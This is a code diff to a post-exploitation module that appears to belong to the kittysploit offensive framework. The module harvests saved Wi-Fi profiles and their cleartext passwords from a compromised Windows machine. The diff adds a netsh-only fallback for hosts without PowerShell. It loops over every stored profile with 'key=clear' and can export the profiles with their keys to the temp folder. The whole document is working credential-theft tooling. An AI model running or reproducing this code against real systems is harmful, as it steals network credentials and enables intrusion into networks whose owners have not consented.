@@ -7,6 +7,7 @@ Extract saved WLAN profiles and cleartext key material
 """
 
 from kittysploit import *
+from lib.post.windows.session import win_compat_failure_type, win_probe_powershell
 import base64
 import os
 import re
@@ -171,17 +172,52 @@ $sections -join "`n`n"
             print_error("netsh.exe is not available on the target")
             return False
 
-        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
-        if "1" not in ps_check:
-            print_error("PowerShell is not available on the target")
-            return False
-
         wlan_check = self._execute_cmd("netsh wlan show interfaces")
         if wlan_check and re.search(
             r"(not supported|not available|not present|n.est pas)", wlan_check, re.I
         ):
             print_warning("WLAN stack may be unavailable on this host")
         return True
+
+    def _parse_profile_names(self, profiles_out: str) -> list:
+        names = []
+        pat = re.compile(
+            r"(?:All User Profile|Profil Tous les utilisateurs|"
+            r"Perfil de todos los usuarios|Benutzerprofil)\s*:\s*(.+)\s*$",
+            re.I,
+        )
+        for line in (profiles_out or "").splitlines():
+            m = pat.search(line.strip())
+            if m:
+                name = m.group(1).strip()
+                if name:
+                    names.append(name)
+        seen = set()
+        ordered = []
+        for n in names:
+            key = n.lower()
+            if key not in seen:
+                seen.add(key)
+                ordered.append(n)
+        return ordered
+
+    def _extract_via_netsh(self, export_xml: bool = False) -> str:
+        profiles_out = self._execute_cmd("netsh wlan show profiles")
+        if not profiles_out:
+            return ""
+        names = self._parse_profile_names(profiles_out)
+        if not names:
+            return "No saved WiFi profiles found for the current user."
+        sections = []
+        for network in names:
+            safe = network.replace('"', '""')
+            detail = self._execute_cmd(f'netsh wlan show profile name="{safe}" key=clear')
+            sections.append(f"=== Profile: {network} ===\n{detail or '(empty)'}")
+            if export_xml:
+                self._execute_cmd(
+                    f'netsh wlan export profile name="{safe}" folder="%TEMP%" key=clear'
+                )
+        return "\n\n".join(sections)
 
     def _save_output(self, content: str) -> str:
         os.makedirs(_LOCAL_OUT, exist_ok=True)
@@ -194,7 +230,7 @@ $sections -join "`n`n"
     def run(self):
         if not self.check():
             raise ProcedureError(
-                FailureType.NotCompatible,
+                win_compat_failure_type(),
                 "WLAN profile extraction prerequisites not met",
             )
 
@@ -203,14 +239,18 @@ $sections -join "`n`n"
         if export_xml:
             print_status("XML profile export enabled")
 
-        result = self._run_powershell(self._powershell_script(export_xml))
+        if win_probe_powershell(self._execute_cmd):
+            result = self._run_powershell(self._powershell_script(export_xml))
+        else:
+            print_info("PowerShell unavailable — using netsh via cmd")
+            result = self._extract_via_netsh(export_xml)
 
         if not result:
             raise ProcedureError(FailureType.Unknown, "No output was returned")
 
         if re.search(r"WLAN_ERROR:", result, re.I):
             print_error(result)
-            raise ProcedureError(FailureType.NotCompatible, result)
+            raise ProcedureError(win_compat_failure_type(), result)
 
         if re.search(r"No saved WiFi profiles found", result, re.I):
             print_warning(result)
